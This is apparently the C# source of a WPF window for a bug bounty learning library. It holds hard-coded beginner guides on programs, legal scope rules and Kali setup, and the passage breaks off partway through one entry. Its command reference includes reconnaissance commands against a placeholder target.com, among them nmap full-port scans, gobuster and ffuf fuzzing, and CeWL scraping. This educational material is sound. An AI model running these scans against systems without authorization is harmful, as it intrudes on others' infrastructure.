using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.ServerSentEvents;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;

namespace VRAX { 

    public partial class KnowledgeBaseWindow : Window
    {
        private Dictionary<string, LibraryTopic> libraryTopics;

        public KnowledgeBaseWindow()
        {
            InitializeComponent();
            InitializeLibrary();
            AttachEvents();
            ExpandAllTreeItems(false);
        }

        private void AttachEvents()
        {
            KnowledgeTree.SelectedItemChanged += OnTopicSelected;
            SearchBox.TextChanged += OnSearchPerformed;
            KnowledgeTree.PreviewKeyDown += OnTreeKeyDown;
            this.KeyDown += OnWindowKeyDown;
        }

        private void OnTreeKeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter && KnowledgeTree.SelectedItem != null)
            {
                var selected = KnowledgeTree.SelectedItem as TreeViewItem;
                if (selected != null) selected.IsExpanded = !selected.IsExpanded;
                e.Handled = true;
            }
        }

        private void OnWindowKeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.F && (Keyboard.Modifiers & ModifierKeys.Control) == ModifierKeys.Control)
            {
                SearchBox.Focus();
                SearchBox.SelectAll();
                e.Handled = true;
            }
            else if (e.Key == Key.Escape)
            {
                SearchBox.Clear();
                KnowledgeTree.Focus();
                e.Handled = true;
            }
        }

        private void ExpandAllTreeItems(bool expand)
        {
            ExpandAllItems(KnowledgeTree.Items, expand);
        }

        private void ExpandAllItems(ItemCollection items, bool expand)
        {
            foreach (object item in items)
            {
                if (item is TreeViewItem treeItem)
                {
                    treeItem.IsExpanded = expand;
                    if (treeItem.Items.Count > 0)
                        ExpandAllItems(treeItem.Items, expand);
                }
            }
        }

        private void OnTopicSelected(object sender, RoutedPropertyChangedEventArgs<object> e)
        {
            if (e.NewValue is TreeViewItem selected && selected.Tag is string tag && libraryTopics.ContainsKey(tag))
            {
                DisplayTopic(libraryTopics[tag]);
            }
        }

        private void OnSearchPerformed(object sender, TextChangedEventArgs e)
        {
            string search = SearchBox.Text.ToLower().Trim();

            if (string.IsNullOrWhiteSpace(search))
            {
                StatusText.Text = "Library ready - Select any topic to begin learning";
                ResetTreeViewVisibility();
                return;
            }

            var matches = libraryTopics.Values.Where(t =>
                t.Title.ToLower().Contains(search) ||
                t.Content.ToLower().Contains(search) ||
                t.Category.ToLower().Contains(search) ||
                t.Commands.Any(cmd => cmd.Text.ToLower().Contains(search) || cmd.Explanation.ToLower().Contains(search)) ||
                t.Steps.Any(step => step.Description.ToLower().Contains(search)) ||
                t.Tools.Any(tool => tool.ToLower().Contains(search)) ||
                t.Resources.Any(res => res.ToLower().Contains(search))
            ).Select(t => t.Tag).ToList();

            FilterTreeView(matches);
            StatusText.Text = $"Found {matches.Count} topics matching '{search}'";

            if (matches.Count == 1)
                SelectTopicByTag(matches[0]);
        }

        private void ResetTreeViewVisibility()
        {
            foreach (object item in KnowledgeTree.Items)
            {
                if (item is TreeViewItem category)
                {
                    category.Visibility = Visibility.Visible;
                    foreach (object subItem in category.Items)
                    {
                        if (subItem is TreeViewItem topic)
                            topic.Visibility = Visibility.Visible;
                    }
                }
            }
        }

        private void FilterTreeView(List<string> matchingTags)
        {
            foreach (object item in KnowledgeTree.Items)
            {
                if (item is TreeViewItem category)
                {
                    bool categoryHasMatch = false;
                    foreach (object subItem in category.Items)
                    {
                        if (subItem is TreeViewItem topic)
                        {
                            if (topic.Tag != null && matchingTags.Contains(topic.Tag.ToString()))
                            {
                                topic.Visibility = Visibility.Visible;
                                categoryHasMatch = true;
                            }
                            else
                            {
                                topic.Visibility = Visibility.Collapsed;
                            }
                        }
                    }
                    category.Visibility = categoryHasMatch ? Visibility.Visible : Visibility.Collapsed;
                    if (categoryHasMatch) category.IsExpanded = true;
                }
            }
        }

        private void SelectTopicByTag(string tag)
        {
            foreach (object item in KnowledgeTree.Items)
            {
                if (item is TreeViewItem category)
                {
                    foreach (object subItem in category.Items)
                    {
                        if (subItem is TreeViewItem topic && topic.Tag?.ToString() == tag)
                        {
                            topic.IsSelected = true;
                            category.IsExpanded = true;
                            return;
                        }
                    }
                }
            }
        }

        private void DisplayTopic(LibraryTopic topic)
        {
            ContentCategory.Text = topic.Category.ToUpper();
            ContentTitle.Text = topic.Title;
            ContentSubtitle.Text = topic.Subtitle;
            ContentPanel.Children.Clear();

            Border descriptionBox = new Border
            {
                Background = (SolidColorBrush)FindResource("BackgroundMedium"),
                CornerRadius = new CornerRadius(8),
                Padding = new Thickness(25),
                Margin = new Thickness(0, 0, 0, 25),
                Child = new TextBlock
                {
                    Text = topic.Content,
                    TextWrapping = TextWrapping.Wrap,
                    Foreground = (SolidColorBrush)FindResource("TextLightGray"),
                    FontSize = 16,
                    LineHeight = 28
                }
            };
            ContentPanel.Children.Add(descriptionBox);

            if (topic.Commands.Any())
            {
                TextBlock commandHeader = new TextBlock
                {
                    Text = "💻 COMMAND REFERENCE",
                    FontWeight = FontWeights.Bold,
                    FontSize = 22,
                    Foreground = (SolidColorBrush)FindResource("AccentRed"),
                    Margin = new Thickness(0, 20, 0, 20)
                };
                ContentPanel.Children.Add(commandHeader);

                foreach (CommandItem cmd in topic.Commands)
                {
                    Border commandCard = new Border
                    {
                        Background = (SolidColorBrush)FindResource("BackgroundLight"),
                        CornerRadius = new CornerRadius(6),
                        Padding = new Thickness(20, 15, 20, 15),
                        Margin = new Thickness(0, 0, 0, 12)
                    };
                    StackPanel stack = new StackPanel();
                    stack.Children.Add(new TextBlock
                    {
                        Text = cmd.Text,
                        FontFamily = new FontFamily("Consolas"),
                        Foreground = (SolidColorBrush)FindResource("CommandGreen"),
                        FontSize = 15,
                        FontWeight = FontWeights.SemiBold
                    });
                    if (!string.IsNullOrEmpty(cmd.Explanation))
                    {
                        stack.Children.Add(new TextBlock
                        {
                            Text = cmd.Explanation,
                            Foreground = (SolidColorBrush)FindResource("TextGray"),
                            FontSize = 14,
                            Margin = new Thickness(0, 8, 0, 0),
                            TextWrapping = TextWrapping.Wrap
                        });
                    }
                    commandCard.Child = stack;
                    ContentPanel.Children.Add(commandCard);
                }
            }

            if (topic.Steps.Any())
            {
                ContentPanel.Children.Add(new TextBlock
                {
                    Text = "📋 STEP-BY-STEP GUIDE",
                    FontWeight = FontWeights.Bold,
                    FontSize = 22,
                    Foreground = (SolidColorBrush)FindResource("AccentRed"),
                    Margin = new Thickness(0, 30, 0, 20)
                });

                foreach (StepItem step in topic.Steps)
                {
                    Border stepCard = new Border
                    {
                        Background = (SolidColorBrush)FindResource("BackgroundMedium"),
                        CornerRadius = new CornerRadius(8),
                        Padding = new Thickness(20),
                        Margin = new Thickness(0, 0, 0, 12)
                    };
                    StackPanel stack = new StackPanel();
                    stack.Children.Add(new TextBlock
                    {
                        Text = $"{step.Number}. {step.Description}",
                        FontWeight = FontWeights.SemiBold,
                        Foreground = (SolidColorBrush)FindResource("TextWhite"),
                        FontSize = 16,
                        TextWrapping = TextWrapping.Wrap,
                        Margin = new Thickness(0, 0, 0, 10)
                    });
                    if (!string.IsNullOrEmpty(step.Code))
                    {
                        Border codeBox = new Border
                        {
                            Background = (SolidColorBrush)FindResource("BackgroundLight"),
                            CornerRadius = new CornerRadius(4),
                            Padding = new Thickness(15),
                            Margin = new Thickness(0, 5, 0, 0)
                        };
                        codeBox.Child = new TextBlock
                        {
                            Text = step.Code,
                            FontFamily = new FontFamily("Consolas"),
                            Foreground = (SolidColorBrush)FindResource("InfoBlue"),
                            FontSize = 14,
                            TextWrapping = TextWrapping.Wrap
                        };
                        stack.Children.Add(codeBox);
                    }
                    stepCard.Child = stack;
                    ContentPanel.Children.Add(stepCard);
                }
            }

            if (topic.Tools.Any())
            {
                ContentPanel.Children.Add(new TextBlock
                {
                    Text = "🔧 TOOLS REFERENCE",
                    FontWeight = FontWeights.Bold,
                    FontSize = 22,
                    Foreground = (SolidColorBrush)FindResource("AccentRed"),
                    Margin = new Thickness(0, 30, 0, 20)
                });
                WrapPanel toolPanel = new WrapPanel();
                foreach (string tool in topic.Tools)
                {
                    Border badge = new Border
                    {
                        Background = (SolidColorBrush)FindResource("BackgroundLight"),
                        CornerRadius = new CornerRadius(20),
                        Padding = new Thickness(15, 8, 15, 8),
                        Margin = new Thickness(0, 0, 10, 10)
                    };
                    badge.Child = new TextBlock
                    {
                        Text = tool,
                        Foreground = (SolidColorBrush)FindResource("InfoBlue"),
                        FontSize = 14,
                        FontWeight = FontWeights.SemiBold
                    };
                    toolPanel.Children.Add(badge);
                }
                ContentPanel.Children.Add(toolPanel);
            }

            if (topic.Resources.Any())
            {
                ContentPanel.Children.Add(new TextBlock
                {
                    Text = "📚 RESOURCES",
                    FontWeight = FontWeights.Bold,
                    FontSize = 22,
                    Foreground = (SolidColorBrush)FindResource("AccentRed"),
                    Margin = new Thickness(0, 30, 0, 20)
                });
                foreach (string resource in topic.Resources)
                {
                    Border resourceCard = new Border
                    {
                        Background = (SolidColorBrush)FindResource("BackgroundMedium"),
                        CornerRadius = new CornerRadius(6),
                        Padding = new Thickness(15, 12, 15, 12),
                        Margin = new Thickness(0, 0, 0, 8)
                    };
                    TextBlock resourceText = new TextBlock
                    {
                        Text = resource,
                        Foreground = (SolidColorBrush)FindResource("InfoBlue"),
                        FontSize = 14,
                        TextWrapping = TextWrapping.Wrap,
                        TextDecorations = TextDecorations.Underline,
                        Cursor = Cursors.Hand
                    };
                    string capturedResource = resource;
                    resourceText.MouseLeftButtonUp += (s, ev) => { try { System.Diagnostics.Process.Start(capturedResource); } catch { } };
                    resourceCard.Child = resourceText;
                    ContentPanel.Children.Add(resourceCard);
                }
            }

            StatusText.Text = $"Viewing: {topic.Title}";
            ContentScrollViewer.ScrollToHome();
        }

        private void InitializeLibrary()
        {
            libraryTopics = new Dictionary<string, LibraryTopic>();
            InitializeGettingStarted();
            InitializeKaliLinux();
            InitializeNetworking();
            InitializeTools();
            InitializeVulnerabilities();
            InitializeReconnaissance();
            InitializeFirstBug();
            InitializeAfterBugs();
            InitializeWebExploitation();
            InitializeAdvancedTopics();
        }

       
        private void InitializeGettingStarted()
        {
            libraryTopics["Intro_BugBounty"] = new LibraryTopic
            {
                Tag = "Intro_BugBounty",
                Category = "Getting Started",
                Title = "Complete Guide to Bug Bounty Hunting",
                Subtitle = "Understanding the World of Ethical Hacking",
                Content = "Bug bounty hunting is the practice of ethically finding and reporting security vulnerabilities in applications, websites, and software in exchange for rewards and recognition. Companies like Google, Facebook, Microsoft, and thousands of others run bug bounty programs to leverage the global security researcher community.\n\nBug bounty hunting has become a legitimate career path with top hunters earning six figures annually. The process involves understanding how applications work, thinking like an attacker, and systematically testing for weaknesses. When you find a valid vulnerability, you document it professionally and submit it through the company's official program.\n\nPlatforms like HackerOne, Bugcrowd, and Intigriti connect researchers with programs, handle legal aspects, and ensure payments are processed. Bug bounty isn't just about money - it's about making the internet safer, learning constantly, and being part of an amazing community of security researchers.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Learn the fundamentals: Start with basic networking, web technologies, and how the internet works.", Code = "Recommended: Complete the PortSwigger Web Security Academy" },
                    new StepItem { Number = 2, Description = "Master the OWASP Top 10: Study the most critical web application security risks.", Code = "Resources: OWASP.org, PortSwigger labs, HackTheBox" },
                    new StepItem { Number = 3, Description = "Set up your testing environment: Install Kali Linux, configure Burp Suite, and learn essential command-line tools.", Code = "sudo apt update && sudo apt install burpsuite nmap gobuster ffuf" },
                    new StepItem { Number = 4, Description = "Practice on legal targets: Use HackTheBox, TryHackMe, and PortSwigger labs to build skills safely.", Code = "Start with: https://portswigger.net/web-security/all-labs" },
                    new StepItem { Number = 5, Description = "Join bug bounty platforms: Create accounts on HackerOne, Bugcrowd, and Intigriti.", Code = "HackerOne: https://hackerone.com/bug-bounty-programs" },
                    new StepItem { Number = 6, Description = "Read disclosed reports: Study how other researchers find and report vulnerabilities.", Code = "https://hackerone.com/hacktivity" },
                    new StepItem { Number = 7, Description = "Start with beginner-friendly programs: Look for programs with clear scope and low competition.", Code = "Check program statistics and response times" },
                    new StepItem { Number = 8, Description = "Document everything: Keep detailed notes of your methodology, findings, and what you learn.", Code = "Use tools like CherryTree, Obsidian, or simple text files" }
                },
                Tools = new List<string> { "Burp Suite", "Kali Linux", "PortSwigger Labs", "HackTheBox", "TryHackMe", "HackerOne", "Bugcrowd", "Intigriti" },
                Resources = new List<string>
                {
                    "https://portswigger.net/web-security",
                    "https://owasp.org/www-project-top-ten/",
                    "https://www.hacker101.com/",
                    "https://www.hackerone.com/bug-bounty-programs",
                    "https://www.bugcrowd.com/bug-bounty/",
                    "https://www.intigriti.com/",
                    "https://github.com/ngalongc/bug-bounty-reference",
                    "https://www.reddit.com/r/bugbounty/",
                    "https://infosecwriteups.com/"
                }
            };

            libraryTopics["Intro_Start"] = new LibraryTopic
            {
                Tag = "Intro_Start",
                Category = "Getting Started",
                Title = "Complete Beginner's Guide to Starting Bug Bounty",
                Subtitle = "Your Roadmap from Zero to First Bounty",
                Content = "Starting in bug bounty can feel overwhelming with so much to learn. This guide provides a structured path from complete beginner to finding your first real vulnerability.\n\nPhase 1: Foundation Building (Months 1-2) - Focus on understanding how the web works. Learn HTML, CSS, JavaScript basics, HTTP protocol, and how browsers communicate with servers. Study networking fundamentals including IP addressing, DNS, ports, and TCP/UDP.\n\nPhase 2: Tool Mastery (Months 2-3) - Install Kali Linux and learn essential tools. Master Burp Suite for intercepting and modifying web traffic. Learn Nmap for port scanning, Gobuster/FFUF for directory enumeration.\n\nPhase 3: Vulnerability Deep Dive (Months 3-4) - Study each vulnerability type in depth. Start with the OWASP Top 10. For each vulnerability, understand how it works, how to detect it, how to exploit it, how to fix it, and how to write a report.\n\nPhase 4: Reconnaissance Skills (Months 4-5) - Learn how to discover attack surface. Master subdomain enumeration, port scanning, technology detection, and Google dorking.\n\nPhase 5: Live Target Practice (Month 5+) - Start with Vulnerability Disclosure Programs (VDPs) that don't offer rewards. After gaining confidence, move to paid programs.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sudo apt update && sudo apt upgrade", Explanation = "Always keep your Kali Linux updated with the latest tools and security patches." },
                    new CommandItem { Text = "sudo apt install burpsuite nmap gobuster ffuf sqlmap wireshark", Explanation = "Install essential bug bounty tools in one command." },
                    new CommandItem { Text = "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt", Explanation = "Directory brute forcing to find hidden directories and files." },
                    new CommandItem { Text = "nmap -sV -sC -p- -T4 target.com", Explanation = "Comprehensive port scan with service detection and default scripts." },
                    new CommandItem { Text = "ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 0", Explanation = "Fast web fuzzing. Filter out false positives by response size with -fs flag." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Complete free online courses: Start with PortSwigger Web Security Academy.", Code = "https://portswigger.net/web-security" },
                    new StepItem { Number = 2, Description = "Set up a practice lab: Install DVWA locally or use online platforms like HackTheBox.", Code = "docker pull vulnerables/web-dvwa" },
                    new StepItem { Number = 3, Description = "Learn Burp Suite thoroughly: Go through each tab and understand how to use them effectively.", Code = "Watch: 'Burp Suite Tutorial' by PortSwigger on YouTube" },
                    new StepItem { Number = 4, Description = "Master command line: Practice Linux commands daily until they become second nature.", Code = "Practice with: ls, cd, grep, find, awk, sed, curl" },
                    new StepItem { Number = 5, Description = "Study disclosed reports: Spend at least 2 hours per week reading how other researchers found bugs.", Code = "https://hackerone.com/hacktivity" },
                    new StepItem { Number = 6, Description = "Join communities: Follow bug bounty hunters on Twitter, join Discord servers.", Code = "Twitter: @NahamSec, @stokfredrik, @tomnomnom" },
                    new StepItem { Number = 7, Description = "Create a methodology document: Write down your step-by-step approach for testing each target.", Code = "Include: Recon, Port scanning, Directory fuzzing, Parameter discovery, Vulnerability testing" },
                    new StepItem { Number = 8, Description = "Start with VDPs: Find programs with Vulnerability Disclosure Policies that don't offer monetary rewards.", Code = "Filter: Programs with 'VDP' tag on HackerOne" }
                },
                Tools = new List<string> { "Kali Linux", "Burp Suite", "Nmap", "Gobuster", "FFUF", "SQLMap", "PortSwigger Academy", "HackTheBox", "TryHackMe", "DVWA" },
                Resources = new List<string>
                {
                    "https://portswigger.net/web-security",
                    "https://www.hacker101.com/",
                    "https://owasp.org/www-project-top-ten/",
                    "https://www.hackthebox.com/",
                    "https://tryhackme.com/",
                    "https://www.hackerone.com/hacktivity",
                    "https://infosecwriteups.com/",
                    "https://pentester.land/",
                    "https://thebugbountyhunter.com/"
                }
            };

            libraryTopics["Intro_Programs"] = new LibraryTopic
            {
                Tag = "Intro_Programs",
                Category = "Getting Started",
                Title = "Choosing the Right Bug Bounty Programs",
                Subtitle = "Strategic Program Selection for Beginners",
                Content = "Selecting the right bug bounty programs is crucial for beginners. The wrong choice can lead to frustration, wasted time, and even legal issues.\n\nFirst, understand the difference between VDPs and paid bounty programs. VDPs allow you to report vulnerabilities but don't offer monetary rewards. They're perfect for beginners because they're less competitive and let you practice without pressure.\n\nWhen evaluating paid programs, look at: program age, response times, bounty ranges, scope clarity, and team reputation. Newer programs often have fewer researchers and more bugs.\n\nScope is everything. Start with programs that have clear, well-defined scope. Look for specific domains, subdomains, and application types listed. Out-of-scope items should be clearly listed.\n\nConsider the technology stack. If you're comfortable with certain technologies (WordPress, React, Python, PHP), choose programs using those technologies.\n\nProgram reputation matters. Read what other researchers say about the program. Are they responsive? Do they pay fairly? Do they communicate well?",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "https://www.hackerone.com/bug-bounty-programs", Explanation = "Browse all HackerOne programs. Filter by response time, bounty range, and program type." },
                    new CommandItem { Text = "https://www.bugcrowd.com/bug-bounty-list/", Explanation = "Bugcrowd's program directory with detailed information about each program's scope and rewards." },
                    new CommandItem { Text = "https://www.intigriti.com/programs", Explanation = "Intigriti's program list. European-focused platform with many beginner-friendly programs." },
                    new CommandItem { Text = "wappalyzer.com", Explanation = "Browser extension to identify technologies used on target websites. Essential for program selection." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Create accounts on all major platforms: HackerOne, Bugcrowd, Intigriti, and YesWeHack.", Code = "Use a professional handle and avatar. Link to LinkedIn, Twitter, and GitHub." },
                    new StepItem { Number = 2, Description = "Start with VDPs only: Filter programs that have no monetary rewards but offer recognition.", Code = "On HackerOne, filter by 'VDP' tag." },
                    new StepItem { Number = 3, Description = "Analyze program scope: For each potential target, read the entire policy document.", Code = "Create a spreadsheet tracking: Program name, in-scope assets, bounty range, response time" },
                    new StepItem { Number = 4, Description = "Check program statistics: Look at number of reports, triage rate, and average payout.", Code = "HackerOne programs show 'Reports resolved' and 'Bounties paid' statistics" },
                    new StepItem { Number = 5, Description = "Research the security team: Look for programs where the team is active in the community.", Code = "Check program's disclosure timeline and public responses on Hacktivity" },
                    new StepItem { Number = 6, Description = "Start with 5-10 programs: Don't spread yourself too thin. Focus on a small set.", Code = "Choose programs with different technology stacks to broaden your learning" },
                    new StepItem { Number = 7, Description = "Monitor program changes: Programs update scope and rules. Set up alerts for changes.", Code = "Use tools like Versionista or follow program Twitter accounts" }
                },
                Tools = new List<string> { "HackerOne", "Bugcrowd", "Intigriti", "YesWeHack", "Wappalyzer", "BuiltWith", "Versionista" },
                Resources = new List<string>
                {
                    "https://www.hackerone.com/bug-bounty-programs",
                    "https://www.bugcrowd.com/bug-bounty-list/",
                    "https://www.intigriti.com/programs",
                    "https://www.yeswehack.com/programs",
                    "https://www.wappalyzer.com/",
                    "https://builtwith.com/"
                }
            };

            libraryTopics["Intro_Legal"] = new LibraryTopic
            {
                Tag = "Intro_Legal",
                Category = "Getting Started",
                Title = "Legal and Ethical Guidelines in Bug Bounty",
                Subtitle = "Staying Safe and Professional",
                Content = "Understanding the legal and ethical boundaries of bug bounty hunting is absolutely critical. One wrong move can result in legal consequences, termination of your accounts, or criminal charges.\n\nThe fundamental rule: Never test without permission. Bug bounty programs provide explicit permission to test within defined scope. Testing outside scope is illegal and unethical.\n\nScope interpretation: Read the scope section carefully. When in doubt, assume it's out of scope and ask the program team.\n\nOut-of-scope items are just as important. Programs often list things NOT to test: denial of service attacks, physical security, social engineering, third-party services.\n\nData handling: If you accidentally access real user data during testing, stop immediately. Do not view, copy, or modify the data. Report what happened to the program team right away.\n\nReporting responsibly: Never disclose vulnerabilities publicly before the program has fixed them and given permission. This is called 'responsible disclosure'.\n\nProof of Concept guidelines: When creating POCs, use your own accounts and test data. Never use real user accounts.\n\nSafe harbor: Most programs provide 'safe harbor' meaning they won't pursue legal action against researchers who follow the rules.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Read the entire program policy: Every word matters. Take screenshots for reference.", Code = "Pay special attention to: Scope, Out of scope, Safe harbor, Disclosure policy" },
                    new StepItem { Number = 2, Description = "Create a testing checklist: Before testing any target, verify it's in scope.", Code = "Use: 'dig target.com' or 'nslookup' to verify domains" },
                    new StepItem { Number = 3, Description = "Use separate accounts: Create dedicated accounts for testing. Never use your real personal accounts.", Code = "Use temporary email services for account creation" },
                    new StepItem { Number = 4, Description = "Set up a testing VM: Use a virtual machine dedicated to bug bounty.", Code = "Kali Linux VM with snapshots for clean state" },
                    new StepItem { Number = 5, Description = "Document everything: Keep detailed logs of your testing activities.", Code = "Use Burp project files to save all requests and responses" },
                    new StepItem { Number = 6, Description = "Stop if uncertain: If you're unsure whether something is allowed, pause and ask the program team.", Code = "Use program's contact method or platform messaging" },
                    new StepItem { Number = 7, Description = "Handle data responsibly: If you encounter real user data, stop immediately and report.", Code = "Take screenshot of what you saw, then stop testing that area" },
                    new StepItem { Number = 8, Description = "Wait for public disclosure: Never share vulnerability details publicly until the program gives permission.", Code = "Programs will notify when vulnerability is fixed and can be disclosed" }
                },
                Resources = new List<string>
                {
                    "https://www.hackerone.com/disclosure-guidelines",
                    "https://www.bugcrowd.com/resource/ethical-hacking-guidelines/",
                    "https://internetbugbounty.org/",
                    "https://www.eff.org/issues/coders/vulnerability-reporting-faq",
                    "https://en.wikipedia.org/wiki/Responsible_disclosure"
                }
            };

            libraryTopics["Intro_Setup"] = new LibraryTopic
            {
                Tag = "Intro_Setup",
                Category = "Getting Started",
                Title = "Complete Testing Environment Setup",
                Subtitle = "Building Your Professional Bug Bounty Workstation",
                Content = "A properly configured testing environment is the foundation of successful bug hunting. This guide walks you through setting up a professional, efficient, and isolated environment.\n\nHardware Requirements: At least 8GB RAM (16GB preferred), 50GB free disk space, and a decent processor. Bug bounty tools are generally lightweight, but running multiple VMs simultaneously requires more resources.\n\nVirtual Machine Setup: Using a VM provides isolation, snapshots, and the ability to revert to clean states. Install VirtualBox or VMware, then download and import a pre-built Kali VM.\n\nBurp Suite Setup: Install Burp Suite Community Edition (free) or Professional. Configure your browser to use Burp as proxy (127.0.0.1:8080). Install Burp's CA certificate to intercept HTTPS traffic.\n\nWordlists: Install SecLists, the most comprehensive wordlist collection. Create custom wordlists based on your targets using tools like CeWL.\n\nAutomation Scripts: As you develop methodologies, automate repetitive tasks with bash scripts or Python. This saves time and ensures consistency across targets.\n\nVPN and Anonymity: While not always necessary, using a VPN can protect your privacy. Choose a reputable VPN provider that doesn't keep logs.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sudo apt update && sudo apt upgrade -y", Explanation = "Update package lists and upgrade all installed packages. Run this at least weekly." },
                    new CommandItem { Text = "sudo apt install -y burpsuite nmap gobuster ffuf sqlmap wireshark hydra john", Explanation = "Install essential bug bounty tools in one command." },
                    new CommandItem { Text = "git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists", Explanation = "Download SecLists, the most comprehensive wordlist collection." },
                    new CommandItem { Text = "sudo apt install -y virtualbox virtualbox-ext-pack", Explanation = "Install VirtualBox if you prefer to run Kali as a VM on another OS." },
                    new CommandItem { Text = "echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc && source ~/.bashrc", Explanation = "Add Go binaries to your PATH for tools written in Go." },
                    new CommandItem { Text = "sudo snap install amass", Explanation = "Install Amass for advanced attack surface mapping and subdomain enumeration." },
                    new CommandItem { Text = "pip3 install arjun paramspider", Explanation = "Install Python-based parameter discovery tools." },
                    new CommandItem { Text = "docker pull vulnerables/web-dvwa", Explanation = "Pull DVWA Docker image for local practice." },
                    new CommandItem { Text = "cewl -d 2 -m 5 -w custom.txt https://target.com", Explanation = "Generate custom wordlist from target website using CeWL." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Download and install VirtualBox or VMware", Code = "https://www.virtualbox.org/wiki/Downloads" },
                    new StepItem { Number = 2, Description = "Download pre-built Kali Linux VM", Code = "https://www.kali.org/get-kali/#kali-virtual-machines" },
                    new StepItem { Number = 3, Description = "Import Kali VM and configure resources (at least 4GB RAM, 2 CPUs)", Code = "File > Import Appliance in VirtualBox" },
                    new StepItem { Number = 4, Description = "Boot Kali, update system, and install additional tools", Code = "sudo apt update && sudo apt upgrade -y" },
                    new StepItem { Number = 5, Description = "Install SecLists wordlist collection", Code = "sudo apt install seclists" },
                    new StepItem { Number = 6, Description = "Configure browser with FoxyProxy and set proxy to 127.0.0.1:8080", Code = "Install FoxyProxy extension, add Burp proxy" },
                    new StepItem { Number = 7, Description = "Install and configure Burp Suite, install CA certificate", Code = "burpsuite (from terminal), then http://burp in browser to download cert" },
                    new StepItem { Number = 8, Description = "Create project directory structure", Code = "mkdir -p ~/bugbounty/{tools,wordlists,targets,scripts,notes}" },
                    new StepItem { Number = 9, Description = "Install Go and add to PATH", Code = "sudo apt install golang && echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc" },
                    new StepItem { Number = 10, Description = "Install popular Go tools (httpx, nuclei, subfinder, etc)", Code = "go install -v github.com/projectdiscovery/{httpx,nuclei,subfinder}/cmd/@latest" },
                    new StepItem { Number = 11, Description = "Take a snapshot of clean VM state", Code = "Machine > Take Snapshot in VirtualBox" }
                },
                Tools = new List<string> { "VirtualBox", "VMware", "Kali Linux", "Burp Suite", "Firefox", "FoxyProxy", "SecLists", "Go", "Docker", "Git", "Python3", "pip", "CeWL", "Amass", "httpx", "nuclei", "subfinder" },
                Resources = new List<string>
                {
                    "https://www.kali.org/docs/",
                    "https://portswigger.net/burp/documentation",
                    "https://github.com/danielmiessler/SecLists",
                    "https://www.docker.com/get-started",
                    "https://golang.org/doc/install"
                }
            };

            libraryTopics["Intro_Scope"] = new LibraryTopic
            {
                Tag = "Intro_Scope",
                Category = "Getting Started",
                Title = "Understanding Scope and Rules",
                Subtitle = "Mastering Bug Bounty Program Boundaries",
                Content = "Understanding scope is absolutely critical in bug bounty hunting. Scope defines what you're allowed to test, what's off-limits, and the rules of engagement. Testing outside scope can get you banned, sued, or even face criminal charges.\n\nWhat is Scope? Scope is the set of assets, vulnerabilities, and testing methods that a bug bounty program explicitly allows. Scope can include domains, subdomains, IP ranges, mobile apps, APIs, source code, and specific application versions.\n\nTypes of Scope:\n1. In-scope - Assets you're explicitly permitted to test\n2. Out-of-scope - Assets you must never test\n3. Wildcard scope - *.target.com means all subdomains\n4. Explicit scope - Specific domains listed individually\n5. Program scope - Which vulnerability types are eligible\n\nCommon Out-of-Scope Items: Third-party services (AWS, Cloudflare, CDNs), physical security, social engineering, denial of service, spamming, brute force attacks, rate limiting testing, and previously reported vulnerabilities.\n\nScope Changes Over Time: Programs update scope. New assets get added, old ones get removed. Always check the program page before testing.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Read the entire program policy document", Code = "Download or screenshot the policy for reference" },
                    new StepItem { Number = 2, Description = "Create a scope checklist", Code = "List all in-scope domains, IPs, and apps" },
                    new StepItem { Number = 3, Description = "Note all out-of-scope items", Code = "Create a separate list of what NOT to test" },
                    new StepItem { Number = 4, Description = "Check for special instructions", Code = "Look for rate limits, test accounts, API keys" },
                    new StepItem { Number = 5, Description = "Verify each asset before testing", Code = "Use dig, nslookup, or online tools to confirm domains exist" },
                    new StepItem { Number = 6, Description = "Set up scope validation in tools", Code = "Configure tools to only target in-scope assets" },
                    new StepItem { Number = 7, Description = "Document any scope questions", Code = "Contact program team through official channels" },
                    new StepItem { Number = 8, Description = "Monitor for scope updates", Code = "Check program page regularly for changes" }
                },
                Tools = new List<string> { "dig", "nslookup", "Amass", "Sublist3r", "httpx", "Burp Suite" },
                Resources = new List<string>
                {
                    "https://docs.hackerone.com/programs/scope.html",
                    "https://docs.bugcrowd.com/programs/scope/",
                    "https://portswigger.net/burp/documentation/desktop/tools/target/scope"
                }
            };

            libraryTopics["Intro_VDP"] = new LibraryTopic
            {
                Tag = "Intro_VDP",
                Category = "Getting Started",
                Title = "VDP vs Paid Programs",
                Subtitle = "Choosing Between Vulnerability Disclosure and Bug Bounty Programs",
                Content = "Understanding the difference between Vulnerability Disclosure Programs (VDPs) and paid bug bounty programs is essential for planning your bug hunting strategy.\n\nWhat is a VDP? A Vulnerability Disclosure Program provides a channel for researchers to report security vulnerabilities but does not offer monetary rewards. VDPs may offer public recognition, swag, or Hall of Fame entries.\n\nWhat is a Bug Bounty Program? Bug bounty programs offer monetary rewards for valid vulnerability reports. Rewards range from $50 for low-severity issues to $50,000+ for critical vulnerabilities.\n\nAdvantages of VDPs for Beginners:\n1. Less competition - many researchers skip VDPs\n2. Lower pressure - learn reporting without worrying about payout disputes\n3. Build reputation - Hall of Fame entries build your resume\n4. Practice reporting - learn the submission process\n5. Network with security teams\n\nAdvantages of Paid Programs:\n1. Financial rewards - earn money for your findings\n2. Recognition - paid programs get more attention\n3. Career opportunities - successful hunters often get job offers\n4. Community respect\n5. Platform reputation carries weight\n\nProgram Maturity: VDPs are often newer programs with less mature security. They may have more bugs but also slower response times.",
                Steps = new List<StepItem>
                {
